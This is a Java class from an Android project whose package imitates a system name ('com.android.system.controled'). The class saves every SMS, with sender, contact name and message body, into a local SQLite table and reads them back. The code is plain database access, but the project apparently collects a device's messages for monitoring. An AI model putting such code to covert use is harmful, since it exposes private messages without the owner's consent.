package com.android.system.controled.db;

import java.util.ArrayList;

import android.content.ContentValues;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;

import com.android.system.controled.Debug;
import com.android.system.controled.bean.SmsInfo;
import com.android.system.controled.util.TimeUtil;

public class TableAllsms {

	private static final String TAG = "TableAllsms";

	private static SQLiteDatabase mSQLiteDatabase = null;

	private static TableAllsms mInstence;

	private TableAllsms() {
	}

	public static TableAllsms getInstence() {
		if (mSQLiteDatabase == null) {
			mSQLiteDatabase = DatabaseUtil.getMDB();
		}

		if (mInstence == null) {
			mInstence = new TableAllsms();
		}
		return mInstence;
	}

	public void close() {
		if (mSQLiteDatabase != null) {
			mSQLiteDatabase.close();
		}
	}

	/**
	 * 插入一条数据
	 * 
	 * @param style
	 * @param down
	 * @param up
	 * @return
	 */
	// public long insertData(int thread_id, long datelong, String dateString, String address, int personId,
	// String personName, int type, String subject, String body, int read, int status) {
	public long insertData(SmsInfo sms, String persionName) {

		long result = -1;
		Cursor cur = null;
		try {
			cur = mSQLiteDatabase.query(DatabaseUtil.TABLE_NAME_ALLSMS, null, DatabaseUtil.ALLSMS_TABLE_COLUMN_DATE_LONG + "=?", new String[] { sms.getDate() + "" }, null, null, null);
			if (cur != null && cur.getCount() > 0) {
				Debug.e(TAG, "already exists this data!");
			} else {
				ContentValues initialValues = new ContentValues();
				initialValues.put(DatabaseUtil.ALLSMS_TABLE_COLUMN_THREAD_ID, sms.getThread_id());
				initialValues.put(DatabaseUtil.ALLSMS_TABLE_COLUMN_DATE_LONG, sms.getDate());
				initialValues.put(DatabaseUtil.ALLSMS_TABLE_COLUMN_DATE_STR, TimeUtil.longToDateTimeString(sms.getDate()));
				initialValues.put(DatabaseUtil.ALLSMS_TABLE_COLUMN_ADDRESS, sms.getAddress());
				initialValues.put(DatabaseUtil.ALLSMS_TABLE_COLUMN_PERSON_ID, sms.getPerson());
				initialValues.put(DatabaseUtil.ALLSMS_TABLE_COLUMN_PERSON_NAME, persionName);
				initialValues.put(DatabaseUtil.ALLSMS_TABLE_COLUMN_TYPE, sms.getType());
				initialValues.put(DatabaseUtil.ALLSMS_TABLE_COLUMN_SUBJECT, sms.getSubject());
				initialValues.put(DatabaseUtil.ALLSMS_TABLE_COLUMN_BODY, sms.getBody());
				initialValues.put(DatabaseUtil.ALLSMS_TABLE_COLUMN_READ, sms.getRead());
				initialValues.put(DatabaseUtil.ALLSMS_TABLE_COLUMN_STATUS, sms.getStatus());
				result = mSQLiteDatabase.insert(DatabaseUtil.TABLE_NAME_ALLSMS, DatabaseUtil.ALLSMS_TABLE_COLUMN_ID, initialValues);
			}

		} catch (Exception e) {
			e.printStackTrace();
		}

		return result;
	}

	//
	// /**
	// * 读取表格一列或几列数据，为空时为全部数据
	// *
	// * @Description:
	// * @param colums
	// * @return
	// * @see:
	// * @since:
	// * @author: zhuanggy
	// * @date:2012-10-26
	// */
	// public static Cursor getData(String[] colums) {
	//
	// if (colums == null || colums.length == 0) {
	// return mSQLiteDatabase.query(DatabaseUtil.DB_NAME, DatabaseUtil.ALLSMS_ALLCOLUMNS, null, null, null,
	// null, null);
	// } else {
	// return mSQLiteDatabase.query(DatabaseUtil.DB_NAME, colums, null, null, null, null, null);
	// }
	//
	// }

	/**
	 * 删除整个表的数据
	 * 
	 * @param db
	 */
	public void deleteTable() {
		mSQLiteDatabase.execSQL(DatabaseUtil.CLEAR_ALLSMS);
	}

	/**
	 * 获得所有信息
	 * @Description:
	 * @return
	 * @see: 
	 * @since: 
	 * @author: zhuanggy
	 * @date:2013-10-12
	 */
	public ArrayList<SmsInfo> getAllSms() {
		ArrayList<SmsInfo> smss = new ArrayList<SmsInfo>();
		Cursor cur = null;
		try {
			cur = mSQLiteDatabase.query(DatabaseUtil.TABLE_NAME_ALLSMS, null, null, null, null, null, null);
			if (cur != null && cur.getCount() > 0) {
				SmsInfo sms = null;
				cur.moveToFirst();
				do {
					sms = new SmsInfo();
					sms.setType(cur.getInt(cur.getColumnIndex(DatabaseUtil.ALLSMS_TABLE_COLUMN_TYPE)));
					sms.setAddress(cur.getString(cur.getColumnIndex(DatabaseUtil.ALLSMS_TABLE_COLUMN_ADDRESS)));
					sms.setName(cur.getString(cur.getColumnIndex(DatabaseUtil.ALLSMS_TABLE_COLUMN_PERSON_NAME)));
					sms.setBody(cur.getString(cur.getColumnIndex(DatabaseUtil.ALLSMS_TABLE_COLUMN_BODY)));
					sms.setDate(cur.getLong(cur.getColumnIndex(DatabaseUtil.ALLSMS_TABLE_COLUMN_DATE_LONG)));
					smss.add(sms);
				} while (cur.moveToNext());
				
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		return smss;
	}
}
